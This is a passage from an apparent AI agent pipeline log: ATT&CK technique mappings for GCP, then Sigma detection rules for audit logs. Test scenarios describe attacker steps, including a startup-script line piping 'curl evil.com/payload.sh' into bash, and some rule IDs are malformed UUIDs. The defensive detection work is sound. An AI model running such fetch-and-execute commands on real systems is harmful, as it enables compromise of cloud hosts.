{\n      \"ttp_id\": \"T1021.007\",\n      \"ttp_name\": \"Remote Services: Cloud Services\",\n      \"tactic\": \"Lateral Movement\",\n      \"description\": \"Adversaries use credentials and permissions gained on one cloud resource to access other resources or services within the same or different cloud accounts/projects.\",\n      \"gcp_relevance\": \"Using access tokens from an impersonated high-privilege service account, an attacker moves laterally to access resources in other GCP projects where the impersonated account has permissions, expanding their access across the organization's cloud environment.\",\n      \"priority\": \"MEDIUM\",\n      \"evidence\": [\n        \"Use elevated privileges to access other GCP projects\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1648\",\n      \"ttp_name\": \"Launch Cloud Instance\",\n      \"tactic\": \"Resource Development\",\n      \"description\": \"Adversaries may launch new virtual machine instances in a compromised cloud environment to support their operations, such as for command and control or data staging.\",\n      \"gcp_relevance\": \"Scattered Spider uses compromised credentials to make `compute.instances.insert` API calls, provisioning new GCP Compute Engine VMs. These attacker-controlled instances are then used to expand their foothold, host C2 infrastructure, or stage data for exfiltration.\",\n      \"priority\": \"LOW\",\n      \"evidence\": [\n        \"Using compromised cloud credentials, attackers provision new GCP resources (e.g., additional Compute Engine VMs, Cloud Storage buckets, networking components) for various purposes...\"\n      ]\n    },\n    {\n      \"ttp_id\": \"T1087.004\",\n      \"ttp_name\": \"Account Discovery: Cloud Account\",\n      \"tactic\": \"Discovery\",\n      \"description\": \"Once inside a cloud environment, an attacker enumerates accounts, roles, and permissions to understand the environment's structure and identify high-value targets for privilege escalation.\",\n      \"gcp_relevance\": \"APT-Cloud-Hunter uses `gcloud` commands or direct API calls (`projects.getIamPolicy`, `iam.serviceAccounts.list`) to map out IAM permissions and find service accounts with valuable roles, such as `iam.serviceAccountTokenCreator`, to exploit for privilege escalation.\",\n      \"priority\": \"LOW\",\n      \"evidence\": [\n        \"Enumerate IAM policies: `gcloud projects get-iam-policy`\",\n        \"List service accounts: `gcloud iam service-accounts list`\"\n      ]\n    }\n  ],\n  \"total_ttps\": 10\n}\"\"\"\n    ),\n  ],\n  role='model'\n), grounding_metadata=None, partial=None, turn_complete=None, finish_reason=<FinishReason.STOP: 'STOP'>, error_code=None, error_message=None, interrupted=None, custom_metadata=None, usage_metadata=GenerateContentResponseUsageMetadata(\n  candidates_token_count=2057,\n  candidates_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=2057\n    ),\n  ],\n  prompt_token_count=9184,\n  prompt_tokens_details=[\n    ModalityTokenCount(\n      modality=<MediaModality.TEXT: 'TEXT'>,\n      token_count=9184\n    ),\n  ],\n  thoughts_token_count=1870,\n  total_token_count=13111,\n  traffic_type=<TrafficType.ON_DEMAND: 'ON_DEMAND'>\n), live_session_resumption_update=None, input_transcription=None, output_transcription=None, avg_logprobs=-0.27504987257687163, logprobs_result=None, cache_metadata=None, citation_metadata=None, interaction_id=None, invocation_id='e-e86f6b95-18c9-47ab-a125-a22235a39e7c', author='ttp_mapper', actions=EventActions(skip_summarization=None, state_delta={}, artifact_delta={}, transfer_to_agent=None, escalate=None, requested_auth_configs={}, requested_tool_confirmations={}, compaction=None, end_of_agent=None, agent_state=None, rewind_before_invocation_id=None), long_running_tool_ids=None, branch=None, id='2c0973c3-98da-4a0e-87c6-ce69e190cf87', timestamp=1770507953.914245)]",
  "sigma_rules": "[Event(model_version='gemini-2.5-pro', content=Content(\n  parts=[\n    Part(\n      text=\"\"\"{\n  \"rules\": [\n    {\n      \"title\": \"GCP User Impersonating Service Account\",\n      \"id\": \"e4a7b8f1-3c5d-4b9c-8a1e-1f2g3h4i5j6k\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects when a non-service account principal (i.e., a user) generates an OAuth2 access token for a service account. This is a primary privilege escalation vector in GCP, allowing an attacker with the 'iam.serviceAccountTokenCreator' role to impersonate a service account and gain all its permissions, potentially bypassing MFA.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1550/001/\",\n        \"https://cloud.google.com/iam/docs/impersonating-service-accounts\",\n        \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.privilege_escalation\",\n        \"attack.t1550.001\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName\": \"google.iam.credentials.v1.GenerateAccessToken\"\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.authenticationInfo.principalEmail|endswith\": \".gserviceaccount.com\"\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Legitimate administrative scripts or tools that run under a user's identity to generate tokens for service accounts, although this is uncommon and should be audited.\",\n        \"Break-glass or emergency access procedures performed by administrators.\"\n      ],\n      \"level\": \"high\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.request.name\",\n        \"resource.labels.project_id\",\n        \"protoPayload.requestMetadata.callerIp\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"A compromised user account 'attacker@example.com' executes 'gcloud iam service-accounts generate-access-token privileged-sa@...', resulting in a 'google.iam.credentials.v1.GenerateAccessToken' log where 'principalEmail' is 'attacker@example.com'.\",\n        \"false_negative\": \"An attacker uses a compromised service account to generate a token for another service account. This is a valid SA-to-SA impersonation scenario not covered by this rule.\",\n        \"false_positive\": \"An on-call SRE 'admin@example.com' uses a documented playbook to manually generate a token for a service account to debug a production issue.\",\n        \"true_negative\": \"A Cloud Build service account ('1234@cloudbuild.gserviceaccount.com') generates a token for a deployment service account as part of a standard CI/CD pipeline.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"google.iam.credentials.v1.GenerateAccessToken\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@external-domain.com\",\n          \"protoPayload.request.name\": \"projects/-/serviceAccounts/admin-sa@victim-project.iam.gserviceaccount.com\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP Service Account Created by Unexpected Principal\",\n      \"id\": \"a9b8c7d6-e5f6-4890-1234-567890abcdef\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects the creation of a new IAM Service Account by an unexpected principal or tool. Adversaries may create new service accounts to establish a persistent backdoor. This rule filters for known automated principals and IaC tools.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1136/003/\",\n        \"https://cloud.google.com/iam/docs/creating-managing-service-accounts\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.persistence\",\n        \"attack.t1136.003\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName\": \"google.iam.admin.v1.CreateServiceAccount\"\n        },\n        \"filter_legitimate\": {\n          \"principal\": {\n            \"protoPayload.authenticationInfo.principalEmail|endswith\": [\n              \".gserviceaccount.com\"\n            ]\n          },\n          \"tool\": {\n            \"protoPayload.requestMetadata.callerSuppliedUserAgent|contains\": [\n              \"Terraform\",\n              \"Pulumi\",\n              \"Deployment Manager\",\n              \"GCP-Console-Enduser\"\n            ]\n          }\n        },\n        \"condition\": \"selection and not (principal or tool)\"\n      },\n      \"falsepositives\": [\n        \"Legitimate manual creation of service accounts by developers or administrators using a non-standard tool or `gcloud`.\",\n        \"A new, unlisted IaC or automation tool being used to create service accounts.\"\n      ],\n      \"level\": \"medium\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.request.accountId\",\n        \"resource.labels.project_id\",\n        \"protoPayload.requestMetadata.callerIp\",\n        \"protoPayload.requestMetadata.callerSuppliedUserAgent\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker, having compromised a developer's account, uses a custom script to create a new service account named 'gcp-backup-svc' to use as a backdoor.\",\n        \"false_negative\": \"An attacker uses Terraform to create a service account, which would be filtered by the 'tool' filter.\",\n        \"false_positive\": \"A developer uses `gcloud iam service-accounts create` to legitimately create a service account for a new application.\",\n        \"true_negative\": \"A Cloud Build service account creates another service account as part of a pipeline, which is filtered by the 'principal' filter.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"google.iam.admin.v1.CreateServiceAccount\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"compromised-user@example.com\",\n          \"protoPayload.request.accountId\": \"backdoor-sa\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP SSH Keys Added To Project or Instance Metadata\",\n      \"id\": \"b2c3d4e5-f6g7-49i0-j1k2-l3m4n5o6p7q8\",\n      \"status\": \"stable\",\n      \"description\": \"Detects when SSH keys are added to project-wide or instance-specific metadata. Adversaries may inject their own public SSH keys to establish persistent, passwordless access to Compute Engine instances.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1098/004/\",\n        \"https://cloud.google.com/compute/docs/connect/add-ssh-keys\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.persistence\",\n        \"attack.t1098.004\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName|endswith\": [\n            \"compute.projects.setCommonInstanceMetadata\",\n            \"compute.instances.setMetadata\"\n          ],\n          \"protoPayload.request.metadata.items.key\": \"ssh-keys\"\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.authenticationInfo.principalEmail\": \"oslogin-admin@system.gserviceaccount.com\"\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Administrators legitimately adding or updating SSH keys for new users.\",\n        \"Use of `gcloud compute ssh` which can automatically add the user's key to project metadata, often triggered by a user's first connection.\",\n        \"Automated systems or IaC tools (Terraform, Ansible) that manage SSH key distribution.\"\n      ],\n      \"level\": \"high\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"resource.labels.project_id\",\n        \"protoPayload.requestMetadata.callerIp\",\n        \"protoPayload.request.metadata.items.value\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker with project editor rights calls 'compute.projects.setCommonInstanceMetadata' to add their public SSH key to the 'ssh-keys' metadata item.\",\n        \"false_negative\": \"An attacker with shell access adds their SSH key directly to the '~/.ssh/authorized_keys' file on a compromised VM instance without using the metadata service. This requires OS-level logging to detect.\",\n        \"false_positive\": \"A new developer runs `gcloud compute ssh` for the first time, and gcloud automatically adds their public key to the project metadata.\",\n        \"true_negative\": \"An administrator updates the 'startup-script' metadata key for an instance.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"v1.compute.projects.setCommonInstanceMetadata\",\n          \"protoPayload.request.metadata.items.key\": \"ssh-keys\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP BigQuery Data Extraction Job\",\n      \"id\": \"c4d5e6f7-g8h9-41j2-k3l4-m5n6o7p8q9r0\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects the creation of a BigQuery job to export data to a Cloud Storage bucket. Adversaries may use this technique to exfiltrate large datasets. This rule is a baseline and should be tuned by adding known legitimate principals or destination bucket names to the filter.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1537/\",\n        \"https://cloud.google.com/bigquery/docs/exporting-data\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.exfiltration\",\n        \"attack.t1537\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName\": \"google.cloud.bigquery.v2.JobService.InsertJob\",\n          \"protoPayload.serviceData.jobInsertion.job.configuration.extract.destinationUris|contains\": \"gs://\"\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.authenticationInfo.principalEmail|endswith\": \"@gcp-sa-bigquery-datastransfer.iam.gserviceaccount.com\"\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Legitimate ETL processes that export data to Cloud Storage for processing, backup, or archival.\",\n        \"Data sharing with partners via approved Cloud Storage buckets.\",\n        \"This rule is prone to false positives and should be tuned by filtering for known-good destination buckets or principal accounts.\"\n      ],\n      \"level\": \"medium\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.serviceData.jobInsertion.job.configuration.extract.sourceTable.projectId\",\n        \"protoPayload.serviceData.jobInsertion.job.configuration.extract.sourceTable.tableId\",\n        \"protoPayload.serviceData.jobInsertion.job.configuration.extract.destinationUris\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker uses compromised credentials to run a BigQuery export job, sending a sensitive table to an external Cloud Storage bucket 'gs://attacker-bucket'.\",\n        \"false_negative\": \"An attacker exfiltrates data row-by-row using the 'tabledata.list' API, which is not a bulk export job.\",\n        \"false_positive\": \"A nightly automated job run by 'prod-etl@my-project.iam.gserviceaccount.com' exports analytics data to a 'gs://my-project-archive' bucket.\",\n        \"true_negative\": \"A data analyst runs a SELECT query within the BigQuery console that does not export any data.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"google.cloud.bigquery.v2.JobService.InsertJob\",\n          \"protoPayload.serviceData.jobInsertion.job.configuration.extract.destinationUris\": \"gs://attacker-controlled-bucket/export.csv\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"compromised-user@example.com\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP Compute Snapshot Deleted\",\n      \"id\": \"d6e7f8g9-h0i1-43k4-l5m6-n7o8p9q0r1s2\",\n      \"status\": \"stable\",\n      \"description\": \"Detects the deletion of a Compute Engine disk snapshot. Adversaries may delete snapshots to inhibit system recovery, often as a precursor to a ransomware attack or other destructive event.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1490/\",\n        \"https://cloud.google.com/compute/docs/disks/create-snapshots\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.impact\",\n        \"attack.t1490\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName|endswith\": \"compute.snapshots.delete\"\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.authenticationInfo.principalEmail|re\": \".+@gcp-sa-gce-snapshot\\\\.iam\\\\.gserviceaccount\\\\.com\"\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Automated scripts or infrastructure-as-code (e.g., Terraform) deleting snapshots as part of resource cleanup.\",\n        \"Administrators manually deleting old or unnecessary snapshots to save costs.\",\n        \"Snapshot lifecycle policies deleting snapshots that have passed their retention period.\"\n      ],\n      \"level\": \"medium\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"resource.labels.project_id\",\n        \"protoPayload.resourceName\",\n        \"protoPayload.requestMetadata.callerIp\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker with editor rights deletes all available disk snapshots to prevent recovery before deploying ransomware.\",\n        \"false_negative\": \"An attacker modifies a snapshot retention policy to retain zero snapshots. The modification of the policy would be the event to detect, not the subsequent deletions by the system.\",\n        \"false_positive\": \"A snapshot lifecycle policy, executed by '1234@gcp-sa-gce-snapshot.iam.gserviceaccount.com', deletes a snapshot that is older than its configured retention period.\",\n        \"true_negative\": \"A new snapshot is created as part of a daily backup schedule.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"v1.compute.snapshots.delete\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\",\n          \"protoPayload.resourceName\": \"projects/victim-project/global/snapshots/snapshot-to-delete\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP VM Startup Script Modified\",\n      \"id\": \"e8f9g0h1-i2j3-45l6-m7n8-o9p0q1r2s3t4\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects modification of a Compute Engine instance's startup script metadata. Adversaries use this technique for persistence, as the script executes with root/System privileges each time the VM starts.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1053/007/\",\n        \"https://cloud.google.com/compute/docs/instances/startup-scripts\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.persistence\",\n        \"attack.execution\",\n        \"attack.t1053.007\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName|endswith\": \"compute.instances.setMetadata\",\n          \"protoPayload.request.metadata.items.key\": [\n            \"startup-script\",\n            \"startup-script-url\",\n            \"windows-startup-script-ps1\",\n            \"windows-startup-script-url\",\n            \"windows-startup-script-bat\",\n            \"windows-startup-script-cmd\"\n          ]\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.requestMetadata.callerSuppliedUserAgent|contains\": [\n            \"Terraform\",\n            \"Ansible\",\n            \"Pulumi\",\n            \"Deployment Manager\",\n            \"gcloud\"\n          ]\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Administrators legitimately updating startup scripts for configuration changes using gcloud or other tools.\",\n        \"Configuration management tools (e.g., Ansible) or IaC tools (e.g., Terraform) modifying instance metadata as part of a planned deployment.\"\n      ],\n      \"level\": \"high\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.resourceName\",\n        \"resource.labels.project_id\",\n        \"protoPayload.request.metadata.items.key\",\n        \"protoPayload.request.metadata.items.value\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker uses a custom script to modify the 'startup-script' metadata of a critical VM to include 'curl evil.com/payload.sh | bash'.\",\n        \"false_negative\": \"An attacker with shell access modifies a systemd service or cron job to achieve persistence, bypassing the instance metadata service.\",\n        \"false_positive\": \"A DevOps engineer uses Terraform to apply an updated startup script to a fleet of VMs.\",\n        \"true_negative\": \"An administrator adds a non-startup-related metadata tag, such as 'owner: team-x', to an instance.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"v1.compute.instances.setMetadata\",\n          \"protoPayload.request.metadata.items.key\": \"startup-script\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP Permissive Inbound Firewall Rule Created\",\n      \"id\": \"f0g1h2i3-j4k5-47m8-n9o0-p1q2r3s4t5u6\",\n      \"status\": \"stable\",\n      \"description\": \"Detects the creation or modification of a GCP Firewall Rule to allow inbound traffic from any source on the internet (0.0.0.0/0). Adversaries create such rules to open ports for C2, remote access, or to expose internal services.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1562/007/\",\n        \"https://cloud.google.com/vpc/docs/firewalls\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.defense_evasion\",\n        \"attack.t1562.007\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName|endswith\": [\n            \"compute.firewalls.insert\",\n            \"compute.firewalls.patch\"\n          ],\n          \"protoPayload.request.sourceRanges\": \"0.0.0.0/0\"\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.request.allowed.ports\": [\n            \"80\",\n            \"443\"\n          ]\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Legitimate creation of firewall rules for public-facing web servers or load balancers on ports 80/443.\",\n        \"Setting up network appliances or services that require broad port access temporarily for configuration.\"\n      ],\n      \"level\": \"high\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"resource.labels.project_id\",\n        \"protoPayload.resourceName\",\n        \"protoPayload.request.allowed.IPProtocol\",\n        \"protoPayload.request.allowed.ports\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker creates a firewall rule named 'allow-rdp' that allows TCP traffic on port 3389 from source '0.0.0.0/0'.\",\n        \"false_negative\": \"An attacker modifies a firewall rule to allow traffic only from a specific IP range they control ('5.6.7.8/32') instead of the global '0.0.0.0/0'.\",\n        \"false_positive\": \"A web administrator creates a firewall rule to allow traffic on ports 80 and 443 from '0.0.0.0/0' for a new public website.\",\n        \"true_negative\": \"A network administrator creates a firewall rule to allow SSH traffic (port 22) between two internal VPC subnets.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"v1.compute.firewalls.insert\",\n          \"protoPayload.request.sourceRanges\": \"0.0.0.0/0\",\n          \"protoPayload.request.allowed.ports\": \"3389\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP IAM Policy Changed via User Impersonation\",\n      \"id\": \"2c8d7b9e-6a4c-4e8d-8a6c-9c3f5d7b1a0e\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects when an IAM policy is modified by a human user that is actively impersonating a service account. This indicates that an escalated privilege obtained through impersonation is being used for lateral movement or persistence by altering permissions.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1021/007/\",\n        \"https://cloud.google.com/iam/docs/impersonating-service-accounts\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.lateral_movement\",\n        \"attack.persistence\",\n        \"attack.t1021.007\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName|endswith\": \"SetIamPolicy\",\n          \"protoPayload.authenticationInfo.serviceAccountDelegationInfo\": \"*\",\n          \"protoPayload.authenticationInfo.principalEmail|contains\": \"@\"\n        },\n        \"filter_legitimate\": {\n          \"protoPayload.authenticationInfo.principalEmail|endswith\": \".gserviceaccount.com\"\n        },\n        \"condition\": \"selection and not filter_legitimate\"\n      },\n      \"falsepositives\": [\n        \"Legitimate administrative actions performed by users who are correctly configured to use service account impersonation for managing IAM policies.\",\n        \"Automated CI/CD pipelines that use user-impersonation to deploy infrastructure and set permissions.\"\n      ],\n      \"level\": \"critical\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.authenticationInfo.serviceAccountDelegationInfo.firstPartyPrincipal.principalEmail\",\n        \"protoPayload.resourceName\",\n        \"protoPayload.requestMetadata.callerIp\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker ('attacker@evil.com'), having impersonated 'privileged-sa@...', uses those credentials to call 'SetIamPolicy' to make their own account a project owner.\",\n        \"false_negative\": \"An attacker uses an access key for a compromised service account directly, without impersonation. The 'serviceAccountDelegationInfo' field would be absent.\",\n        \"false_positive\": \"A lead cloud engineer, following best practices, impersonates a deployment service account to manually apply a hotfix to an IAM policy.\",\n        \"true_negative\": \"A service account, acting on its own, modifies an IAM policy without any impersonation involved.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"google.iam.v1.IAMPolicy.SetIamPolicy\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@evil.com\",\n          \"protoPayload.authenticationInfo.serviceAccountDelegationInfo\": \"{...}\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP Compute Engine Instance Launched\",\n      \"id\": \"3b4c5d6e-7f8g-4a0b-1c2d-3e4f5a6b7c8d\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects the launch of a new GCP Compute Engine virtual machine instance. Adversaries may launch new instances in a compromised environment for C2, data staging, or to expand their operational infrastructure. This rule is informational and intended for hunting.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1648/\",\n        \"https://cloud.google.com/compute/docs/instances/create-start-instance\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.resource_development\",\n        \"attack.t1648\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName|endswith\": \"compute.instances.insert\"\n        },\n        \"filter_legitimate\": {\n          \"principal\": {\n            \"protoPayload.authenticationInfo.principalEmail|re\": \".*@gce-spot-agent\\\\.iam\\\\.gserviceaccount\\\\.com|.*@cloudbuild\\\\.gserviceaccount\\\\.com\"\n          },\n          \"tool\": {\n            \"protoPayload.requestMetadata.callerSuppliedUserAgent|contains\": \"Terraform\"\n          }\n        },\n        \"condition\": \"selection and not (principal or tool)\"\n      },\n      \"falsepositives\": [\n        \"Legitimate creation of VMs by developers for testing.\",\n        \"Auto-scaling groups launching new instances in response to increased load.\",\n        \"CI/CD pipelines creating ephemeral VMs for build and test jobs.\",\n        \"Deployment of new applications via infrastructure-as-code.\"\n      ],\n      \"level\": \"informational\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.resourceName\",\n        \"resource.labels.project_id\",\n        \"protoPayload.request.machineType\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker with compromised credentials uses a custom script to create a new VM named 'c2-server' to host their infrastructure.\",\n        \"false_negative\": \"An attacker compromises an existing, dormant VM and repurposes it, which does not involve an 'insert' operation.\",\n        \"false_positive\": \"A Google Compute Engine autoscaler group creates a new VM to handle a spike in web traffic.\",\n        \"true_negative\": \"An administrator stops and then starts an existing VM.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"v1.compute.instances.insert\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\",\n          \"protoPayload.resourceName\": \"projects/victim-project/zones/us-central1-a/instances/c2-server\"\n        }\n      }\n    },\n    {\n      \"title\": \"GCP IAM Discovery Activity\",\n      \"id\": \"4a5b6c7d-8e9f-4b1c-2d3e-4f5a6b7c8d9e\",\n      \"status\": \"experimental\",\n      \"description\": \"Detects enumeration of IAM policies and service accounts. After gaining access, adversaries perform reconnaissance to map permissions and plan escalation. This rule is highly informational and should be used for threat hunting, not direct alerting, unless correlated and thresholded in a SIEM.\",\n      \"references\": [\n        \"https://attack.mitre.org/techniques/T1087/004/\",\n        \"https://cloud.google.com/iam/docs/reference/rest\"\n      ],\n      \"author\": \"Automated Detection Agent\",\n      \"date\": \"2024-07-29\",\n      \"modified\": \"2024-07-31\",\n      \"tags\": [\n        \"attack.discovery\",\n        \"attack.t1087.004\"\n      ],\n      \"logsource\": {\n        \"product\": \"gcp\",\n        \"service\": \"gcp.audit\"\n      },\n      \"detection\": {\n        \"selection\": {\n          \"protoPayload.methodName\": [\n            \"google.iam.v1.IAMPolicy.GetIamPolicy\",\n            \"google.iam.v1.IAMPolicy.TestIamPermissions\",\n            \"google.iam.admin.v1.ListServiceAccounts\",\n            \"google.cloud.resourcemanager.v3.Projects.GetIamPolicy\"\n          ]\n        },\n        \"condition\": \"selection\"\n      },\n      \"falsepositives\": [\n        \"Any legitimate use of the GCP Console, `gcloud`, or IaC tools which make numerous 'Get' and 'List' calls.\",\n        \"This rule is extremely noisy and requires a SIEM to apply anomaly detection or thresholding (e.g., >N calls from a single user in Y minutes) to become actionable.\"\n      ],\n      \"level\": \"informational\",\n      \"fields\": [\n        \"protoPayload.authenticationInfo.principalEmail\",\n        \"protoPayload.requestMetadata.callerIp\",\n        \"protoPayload.requestMetadata.callerSuppliedUserAgent\",\n        \"protoPayload.resourceName\"\n      ],\n      \"test_scenarios\": {\n        \"true_positive\": \"An attacker uses a script to iterate through all projects, calling 'GetIamPolicy' and 'TestIamPermissions' on each one.\",\n        \"false_negative\": \"An attacker who already knows their target does not need to perform broad discovery, thus may not trigger any threshold-based alerts built on this rule.\",\n        \"false_positive\": \"A developer opens the IAM page in the GCP console, triggering dozens of 'GetIamPolicy' calls.\",\n        \"true_negative\": \"A user creates a new Cloud Storage bucket.\",\n        \"log_source_schema\": \"https://cloud.google.com/logging/docs/audit/gcp-audit-logs-v2\",\n        \"example_log_fields\": {\n          \"protoPayload.methodName\": \"google.iam.v1.IAMPolicy.GetIamPolicy\",\n          \"protoPayload.authenticationInfo.principalEmail\": \"attacker@example.com\",\n          